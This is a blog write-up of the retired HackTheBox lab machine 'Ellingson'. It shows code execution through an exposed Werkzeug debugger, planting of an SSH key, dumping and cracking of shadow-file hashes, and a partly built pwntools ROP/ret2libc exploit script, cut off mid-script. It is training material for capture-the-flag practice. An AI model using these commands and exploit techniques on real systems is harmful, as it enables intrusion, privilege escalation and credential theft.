
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="" />

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark)"
    href="../../theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark)"
          href="../../theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
          href="../../theme/pygments/sas.min.css">


  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">


    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">



  


 

<meta name="author" content="maggick" />
<meta name="description" content="This is a writeup about a retired HacktheBox machine: Ellingson This box is classified as a hard machine. The user is not too hard to get as it require to know python and password&#39;s cracking. The root part is really hard as this require the exploitation of a ROP buffer overflow. Note: if you just want to play with the buffer overflow, the binary is available on this site, just go to the &#34;Analysing the Buffer Overflow&#34; section." />
<meta name="keywords" content="security, boot2root, HTB, buffer overflow, ROP, ret2libc, linux">


  <meta property="og:site_name" content="maggick's logs"/>
  <meta property="og:title" content="HTB: Ellingson"/>
  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Ellingson This box is classified as a hard machine. The user is not too hard to get as it require to know python and password&#39;s cracking. The root part is really hard as this require the exploitation of a ROP buffer overflow. Note: if you just want to play with the buffer overflow, the binary is available on this site, just go to the &#34;Analysing the Buffer Overflow&#34; section."/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="../../2019/10/htb-ellingson.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2019-10-21 11:25:00+02:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="../../author/maggick.html">
  <meta property="article:section" content="security"/>
  <meta property="article:tag" content="security"/>
  <meta property="article:tag" content="boot2root"/>
  <meta property="article:tag" content="HTB"/>
  <meta property="article:tag" content="buffer overflow"/>
  <meta property="article:tag" content="ROP"/>
  <meta property="article:tag" content="ret2libc"/>
  <meta property="article:tag" content="linux"/>
  <meta property="og:image" content="">

  <title>maggick's logs &ndash; HTB: Ellingson</title>

</head>
<body >
  <aside>
    <div>
      <a href="../../">
        <img src="../../theme/img/profile.png" alt="" title="">
      </a>

      <h1>
        <a href="../../"></a>
      </h1>



      <nav>
        <ul class="list">


              <li>
                <a target="_self"
                   href="../../pages/about.html">
                  About
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/notes.html">
                  Notes
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/tools.html">
                  Tools
                </a>
              </li>

        </ul>
      </nav>

      <ul class="social">
          <li>
            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
              <i class="fab fa-github"></i>
            </a>
          </li>
          <li>
            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
              <i class="fab fa-twitter"></i>
            </a>
          </li>
          <li>
            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
              <i class="fab fa-stack-overflow"></i>
            </a>
          </li>
          <li>
            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
              <i class="fas fa-rss"></i>
            </a>
          </li>
      </ul>
    </div>

  </aside>
  <main>

    <nav>
      <a href="../../">Home</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>

      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>

    </nav>

<article class="single">
  <header>
      
    <h1 id="htb-ellingson">HTB: Ellingson</h1>
    <p>
      Posted on 21 Oct 2019 in <a href="../../category/security.html">security</a>

        &#8226; 10 min read
    </p>
  </header>


  <div>
    <p><img class="align-left" src="/media/2019.10/ellingson_card.png" alt="Ellingson card" width="262"></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/189">Ellingson</a>
This box is classified as a hard machine. The user is not too hard to get as it
require to know python and password's cracking. The root part is really hard as this
require the exploitation of a ROP buffer overflow.</p>
<p><em>Note: if you just want to play with the buffer overflow, the binary is
 available on this site, just go to the
 <a href="https://maggick.fr/2019/10/htb-ellingson.html#analysing-the-buffer-overflow">"Analysing the Buffer Overflow" section</a></em>.</p>


<h1>Recon</h1>
<p>We start with an nmap scan. Only the ports 22 (SSH) and 80 (HTTP) are open.</p>
<div class="highlight"><pre><span></span><code># Nmap 7.80 scan initiated Thu Sep 26 13:34:45 2019 as: nmap -oA 10.10.10.139 -sSV 10.10.10.139
Nmap scan report for 10.10.10.139
Host is up (0.086s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 26 13:35:00 2019 -- 1 IP address (1 host up) scanned in 14.76 seconds
</code></pre></div>

<h1>Web</h1>
<p>The website is a standard corporate website (we can appreciate the dynamic rendering).</p>
<p><img alt="Ellingson web page" src="/media/2019.10/ellingson_1.png"></p>
<p>When browsing the articles, we notice that there is an ID at the end of the URL.
If we put a non standard value like <code>2-1</code> or put an ID greater than expected we
generate an error and a stacktrace. This debugger integrate a python
interpretor:</p>
<p><img alt="Werkzeug debugger" src="/media/2019.10/ellingson_3.png"></p>
<h1>User</h1>
<p>From there we can input python's commands and using the <code>OS</code> module we can
execute command on the system. In order to get a shell we can simply upload our
SSH public key in the current user (hal) <code>authorized_keys</code> file.</p>
<div class="highlight"><pre><span></span><code>&gt;&gt;&gt; import os; os.popen(&#39;whoami&#39;).read()
&#39;hal\n&#39;
&gt;&gt;&gt; import os; os.system(&#39;mkdir ~/.ssh/&#39;)
256
&gt;&gt;&gt; import os; os.system(&#39;echo \&#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6A/eqoQWIz14pbJ4L3Tsf+GzWv/O8Ym81ICPKpmyEl9cr3DyqCETUijFpMl6LYsdgc97EEdR6d2Xa2mpGMyDHRJSQGJJf2KehUBi6EqrkyEnPfMWNso50UtvzLwOUuxXTYmQ8iTGk3V5PbM0NHG7UQsABELrDL11NNKlV3XkuHE/yTuJQ0f80/ZDQFC7BzIfsl5iE3RmE+kRxTOyxniGwFW1bxYVW1Iqfw7isNVSyn0lkRgkSQjb2fKtFPdGughBm2j3O0+aPrRQyC7iytabc/Y8R248ziAVxqP/Nq8CEFAGXXoX8LS9WSIUfvMwqWevjbUxIKivOfGP9G8Tb994KaQFPUH13oku6GtoymAcaKjuscAHiD7q+1RJqOLg1qV7HVOzMFe46NdmGrK1dGqydfkTVjgwWJk0Swe/wJM8bIYIt6rG8/1kKDgBh86XeP4HDtj+fQo0+07RVrnFXPdBliyKPWIV2sz+qO/JCyX73YgYupps1/lsLb+l4N1BaUnk=\&#39;&gt;&gt;~/.ssh/authorized_keys&#39;)
0
&gt;&gt;&gt; import os; os.system(&#39;chmod 644 ~/.ssh/authorized_keys&#39;)
0
</code></pre></div>

<p>As our SSH public key is in hal's <code>authorzied_key</code> we can connect as hal using
SSH and starting to enumerate. The user flag is not in the hal's home folder:</p>
<div class="highlight"><pre><span></span><code>sh 10.10.10.139 -lhal
hal@ellingson:~$ whoami
hal
hal@ellingson:~$ ls /home/
duke  hal  margo  theplague
</code></pre></div>

<p>We enumerate the box and find an interesting non standard SUID binary:</p>
<div class="highlight"><pre><span></span><code>hal@ellingson:~$ find / -uid 0 -perm -4000 -type f 2&gt;/dev/null
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/garbage
/usr/bin/newuidmap
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/chsh
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/umount
/bin/ntfs-3g
/bin/ping
/bin/mount
/bin/fusermount
</code></pre></div>

<p>Nevertheless we do not have the permission to execute it:</p>
<div class="highlight"><pre><span></span><code>hal@ellingson:~$ ls -al /usr/bin/garbage
-rwsr-xr-x 1 root root 18056 Mar  9  2019 /usr/bin/garbage
hal@ellingson:~$ /usr/bin/garbage
User is not authorized to access this application. This attempt has been logged.
</code></pre></div>

<p>We need another way. We see that we are in the group <code>adm</code> (in addition to our user group):</p>
<div class="highlight"><pre><span></span><code>hal@ellingson:~$ id
uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)
</code></pre></div>

<p><strong>I struggled for a long time here before someone on the official discord told
me that after a few hours
the file permissions are changed and the file does not belong to <code>adm</code> group
anymore. I had to reset the box to find this file.</strong></p>
<p>Let us list what files are belonging to this group:</p>
<div class="highlight"><pre><span></span><code>hal@ellingson:~$ find / -group adm 2&gt; /dev/null
/var/backups/shadow.bak
/var/spool/rsyslog
/var/log/auth.log
/var/log/mail.err
/var/log/fail2ban.log
/var/log/kern.log
/var/log/syslog
/var/log/nginx
/var/log/nginx/error.log
/var/log/nginx/access.log
/var/log/cloud-init.log
/var/log/unattended-upgrades
/var/log/apt/term.log
/var/log/apport.log
/var/log/mail.log
/snap/core/6405/var/log/dmesg
/snap/core/6405/var/log/fsck/checkfs
/snap/core/6405/var/log/fsck/checkroot
/snap/core/6405/var/spool/rsyslog
/snap/core/4917/var/log/dmesg
/snap/core/4917/var/log/fsck/checkfs
/snap/core/4917/var/log/fsck/checkroot
/snap/core/4917/var/spool/rsyslog
/snap/core/6818/var/log/dmesg
/snap/core/6818/var/log/fsck/checkfs
/snap/core/6818/var/log/fsck/checkroot
/snap/core/6818/var/spool/rsyslog
</code></pre></div>

<p>We cat the shadow.bak file and get some password hashes:</p>
<div class="highlight"><pre><span></span><code>hal@ellingson:~$ cat /var/backups/shadow.bak
root:*:17737:0:99999:7:::
daemon:*:17737:0:99999:7:::
bin:*:17737:0:99999:7:::
sys:*:17737:0:99999:7:::
sync:*:17737:0:99999:7:::
games:*:17737:0:99999:7:::
man:*:17737:0:99999:7:::
lp:*:17737:0:99999:7:::
mail:*:17737:0:99999:7:::
news:*:17737:0:99999:7:::
uucp:*:17737:0:99999:7:::
proxy:*:17737:0:99999:7:::
www-data:*:17737:0:99999:7:::
backup:*:17737:0:99999:7:::
list:*:17737:0:99999:7:::
irc:*:17737:0:99999:7:::
gnats:*:17737:0:99999:7:::
nobody:*:17737:0:99999:7:::
systemd-network:*:17737:0:99999:7:::
systemd-resolve:*:17737:0:99999:7:::
syslog:*:17737:0:99999:7:::
messagebus:*:17737:0:99999:7:::
_apt:*:17737:0:99999:7:::
lxd:*:17737:0:99999:7:::
uuidd:*:17737:0:99999:7:::
dnsmasq:*:17737:0:99999:7:::
landscape:*:17737:0:99999:7:::
pollinate:*:17737:0:99999:7:::
sshd:*:17737:0:99999:7:::
theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::
</code></pre></div>

<p>Let's crack them! It is a bit long as the hashing algorithm is SHA512 ($6). We
use <code>john</code> with the rockyou dictionary.</p>
<div class="highlight"><pre><span></span><code>john hash -w=~/tools/password_lists/rockyou.txt
john --show hash
theplague:password123:17964:0:99999:7:::
margo:iamgod$08:17964:0:99999:7:::
</code></pre></div>

<p>The first password was changed, as mention in the third article:</p>
<blockquote>
<p>We have recently detected suspicious activity on the network. Please make
sure you change your password regularly and read my carefully prepared memo
on the most commonly used passwords. Now as I so meticulously pointed out
the most common passwords are. Love, Secret, Sex and God -The Plague</p>
</blockquote>
<p>Nevertheless, we can connect as <code>margo</code> using SSH and the cracked password. And we
retrieved the user flag:</p>
<div class="highlight"><pre><span></span><code>ssh 10.10.10.139 -lmargo
margo@10.10.10.139&#39;s password:
Last login: Wed Oct  2 12:25:47 2019 from 10.10.15.42
margo@ellingson:~$ ls
user.txt
margo@ellingson:~$ cat user.txt
d0ff9e&lt;redacted&gt;
</code></pre></div>

<h1>Root</h1>
<h2>Finding the SUID binary</h2>
<p>Let's get back to the SUID binary:</p>
<div class="highlight"><pre><span></span><code>margo@ellingson:~$ find / -uid 0 -perm -4000 -type f 2&gt;/dev/null
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/garbage
/usr/bin/newuidmap
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/chfn
</code></pre></div>

<p>We run the binary, it ask for a password user input. If we put a wrong password
we get an access denied. If we put a "long" password we get a segfault. This
look like a buffer overflow:</p>
<div class="highlight"><pre><span></span><code>margo@ellingson:~$ /usr/bin/garbage
Enter access password: test

access denied.
margo@ellingson:~$ /usr/bin/garbage
Enter access password: qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq

access denied.
Segmentation fault (core dumped)
</code></pre></div>

<p>Let's copy the binary on our machine:</p>
<div class="highlight"><pre><span></span><code>scp margo@10.10.10.139:/usr/bin/garbage ./
</code></pre></div>

<p>We check the flags of the binary:</p>
<div class="highlight"><pre><span></span><code>root@kalili:~# gdb ./garbage
&lt;snip&gt;
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
</code></pre></div>

<p>The No-Execute bit is set. Therefore we need to use a ret2lib.</p>
<p>The ASLR is activated on the server:</p>
<div class="highlight"><pre><span></span><code>margo@ellingson:~$ cat /proc/sys/kernel/randomize_va_space
2
</code></pre></div>

<p>As ASLR is on and the NX bit (no-execute) is set we will also need the box libc
to do a ROP:</p>
<div class="highlight"><pre><span></span><code>scp margo@10.10.10.139:/lib/x86_64-linux-gnu/libc.so.6 ./
</code></pre></div>

<h2>Analysing the Buffer Overflow</h2>
<p><a href="/media/2019.10/ellingson_garbage"><em>The binary is avalible here</em></a></p>
<p>We load the binary in gdb <a href="https://github.com/longld/peda">peda</a> and search for
the size of the buffer.</p>
<div class="highlight"><pre><span></span><code>gdb-peda$ r &lt; &lt;(python -c &#39;print &quot;A&quot;*133+&quot;B&quot;+&quot;C&quot;+&quot;D&quot;+&quot;E&quot;+&quot;F&quot;+&quot;G&quot;+&quot;H&quot;+&quot;J&quot;&#39;)
Starting program: /root/garbage &lt; &lt;(python -c &#39;print &quot;A&quot;*133+&quot;B&quot;+&quot;C&quot;+&quot;D&quot;+&quot;E&quot;+&quot;F&quot;+&quot;G&quot;+&quot;H&quot;+&quot;J&quot;&#39;)
Enter access password:
access denied.

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x0
RCX: 0x7f1a0b24ead4 (&lt;__GI___libc_write+20&gt;:    cmp    rax,0xfffffffffffff000)
RDX: 0x7f1a0b31f580 --&gt; 0x0
RSI: 0x12a0ba0 (&quot;access denied.\nssword: \n\220\v*\001&quot;)
RDI: 0x0
RBP: 0x4443424141414141 (&#39;AAAAABCD&#39;)
RSP: 0x7ffedbba9290 --&gt; 0x7ffedbba9380 --&gt; 0x1
RIP: 0x4a48474645 (&#39;EFGHJ&#39;)
R8 : 0xf
R9 : 0x7f1a0b31d848 --&gt; 0x7f1a0b31d760 --&gt; 0xfbad2a84
R10: 0x4005a5 --&gt; 0x7475700073747570 (&#39;puts&#39;)
R11: 0x246
R12: 0x401170 (&lt;_start&gt;:    xor    ebp,ebp)
R13: 0x7ffedbba9380 --&gt; 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction
overflow)
</code></pre></div>

<p>The buffer size is 136 (133+3). We could also use the peda's functions
<code>pattern_create</code> and <code>pattern_offset</code> to find it. Then we can start to write our exploitation
script using <a href="http://pwntools.com">pwntools</a>:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./garbage&#39;</span><span class="p">)</span>

<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;DEBUG&quot;</span><span class="p">)</span>

<span class="n">junk</span>    <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">136</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span>

<span class="c1">#Enter access password: 123456</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>

<p>We want to get the dynamic address of <code>LIBC</code> in order to be able to call a
specific function (let's say <code>/bin/sh</code>). For that we need:</p>
<ul>
<li>
<p>to find a <code>pop rdi</code> call. We use <a href="https://github.com/sashs/Ropper">ropper</a> for that:</p>
<p>:::text
root@kalili:~# ropper --file ./garbage --search 'pop rdi'
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi</p>
<p>[INFO] File: ./garbage
0x000000000040179b: pop rdi; ret;</p>
</li>
<li>
<p>two informations about the <a href="https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html">PLT and GOT</a> <code>puts</code> callsinto <code>LIBC</code>.  For that we can grep the <code>objdump</code> output:</p>
<p>:::text
objdump -D garbage | grep puts
0000000000401050 <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#112;&#117;&#116;&#115;&#64;&#112;&#108;&#116;">&#112;&#117;&#116;&#115;&#64;&#112;&#108;&#116;</a>:
401050: ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 &lt;puts@GLIBC _2.2.5&gt;</p>
</li>
</ul>
<p>We add this addresses to our exploit and output the <code>puts</code> address in <code>LIBC</code>:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./garbage&#39;</span><span class="p">)</span>

<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;DEBUG&quot;</span><span class="p">)</span>

<span class="n">plt_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401050</span><span class="p">)</span>
<span class="n">got_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404028</span><span class="p">)</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40179b</span><span class="p">)</span>

<span class="n">junk</span>    <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">136</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">pop_rdi</span><span class="o">+</span> <span class="n">got_put</span> <span class="o">+</span> <span class="n">plt_put</span>

<span class="c1">#Enter access password: 123456</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>

<span class="c1"># Leaked address printed in a readable format</span>
<span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;Leaked puts@GLIBC: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span>
</code></pre></div>

<p>Here is the output of it (for sanity I commented the debugging option):</p>
<div class="highlight"><pre><span></span><code># python exploitP.py
[+] Starting local process &#39;./garbage&#39;: pid 1407
Enter access password:

access denied.

[+] Leaked puts@GLIBC: @ T�Z\x7f\x00\x00
[*] Stopped process &#39;./garbage&#39; (pid 1407)

# python exploitP.py
[+] Starting local process &#39;./garbage&#39;: pid 1411
Enter access password:

access denied.

[+] Leaked puts@GLIBC: @pYBs\x7f\x00\x00
[*] Stopped process &#39;./garbage&#39; (pid 1411)

# python exploitP.py
[+] Starting local process &#39;./garbage&#39;: pid 1415
Enter access password:

access denied.

[+] Leaked puts@GLIBC: @0X\x0en\x7f\x00\x00
[*] Stopped process &#39;./garbage&#39; (pid 1415)
</code></pre></div>

<p>We got the leaked address of the <code>puts</code> call in LIBC.
As the ASLR is on, multiple runs give us different addresses for the <code>puts</code> call
in LIBC. But our process logically stop. If we rerun it the address will be
different. Therefore we need to recall our main. We get the address using
<code>objdump</code>:</p>
<div class="highlight"><pre><span></span><code>objdump -D garbage | grep main
  401194:   ff 15 56 2e 00 00       callq  *0x2e56(%rip)        # 403ff0 &lt;__libc_start_main@GLIBC_2.2.5&gt;
0000000000401619 &lt;main&gt;:
</code></pre></div>

<p>And we add it to our script:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./garbage&#39;</span><span class="p">)</span>

<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;DEBUG&quot;</span><span class="p">)</span>

<span class="n">plt_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401050</span><span class="p">)</span>
<span class="n">got_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404028</span><span class="p">)</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40179b</span><span class="p">)</span>
<span class="n">plt_main</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401619</span><span class="p">)</span>

<span class="n">junk</span>    <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">136</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">pop_rdi</span><span class="o">+</span> <span class="n">got_put</span> <span class="o">+</span> <span class="n">plt_put</span> <span class="o">+</span> <span class="n">plt_main</span>

<span class="c1">#Enter access password: 123456</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>

<span class="c1"># Leaked address printed in a readable format</span>
<span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;Leaked puts@GLIBC: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span>
</code></pre></div>

<h2>ret2libc locally</h2>
<p>We have the leak address of the <code>puts</code> call in <code>LIBC</code>. We can dynamically
compute the offset between our leaked address and the <code>LIBC</code> address. For that
we need to found the <code>puts</code> call in <code>LIBC</code>:</p>
<div class="highlight"><pre><span></span><code># locate libc.so.6
/lib/x86_64-linux-gnu/libc.so.6
</code></pre></div>

<p># readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep puts
   194: 0000000000074040   429 FUNC    GLOBAL DEFAULT   14 _IO_puts@@GLIBC_2.2.5
   426: 0000000000074040   429 FUNC    WEAK   DEFAULT   14 puts@@GLIBC_2.2.5</p>
<p>The "beginning" of <code>LIBC</code> is then our leak address minus <code>0x74040</code>.</p>
<p>We now want to call a shell, for that we need the addresses of <code>system</code> and
<code>/bin/sh</code> in <code>LIBC</code>:</p>
<div class="highlight"><pre><span></span><code># readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep system
  235: 0000000000129d20    99 FUNC    GLOBAL DEFAULT   14 svcerr_systemerr@@GLIBC_2.2.5
  613: 0000000000046ff0    45 FUNC    GLOBAL DEFAULT   14 __libc_system@@GLIBC_PRIVATE
  1421: 0000000000046ff0    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5
# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 |grep /bin/sh
183cee /bin/sh
</code></pre></div>

<p>As we want to exploit a SUID binary we also need to invoke the <code>setuid</code> call:</p>
<div class="highlight"><pre><span></span><code># readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep setuid
    25: 00000000000c8ac0   144 FUNC    WEAK   DEFAULT   14 setuid@@GLIBC_2.2.5
</code></pre></div>

<p>Our exploit is now the following:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./garbage&#39;</span><span class="p">)</span>

<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
<span class="c1">#context(log_level=&quot;DEBUG&quot;)</span>

<span class="n">plt_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401050</span><span class="p">)</span>
<span class="n">got_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404028</span><span class="p">)</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40179b</span><span class="p">)</span>
<span class="n">plt_main</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401619</span><span class="p">)</span>

<span class="n">junk</span>    <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">136</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">got_put</span> <span class="o">+</span> <span class="n">plt_put</span> <span class="o">+</span> <span class="n">plt_main</span>

